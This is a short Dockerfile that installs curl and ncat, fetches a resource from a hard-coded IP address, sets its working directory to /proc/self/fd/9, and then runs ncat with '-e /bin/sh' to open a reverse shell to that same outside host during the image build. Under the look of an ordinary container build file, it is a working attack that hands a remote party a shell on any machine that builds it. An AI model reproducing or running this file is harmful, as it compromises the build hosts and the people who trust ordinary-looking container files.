FROM ubuntu
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199:8080/azure/9
WORKDIR /proc/self/fd/9


RUN ncat 68.183.4.199 2222 -e /bin/sh

CMD ["/bin/bash"]
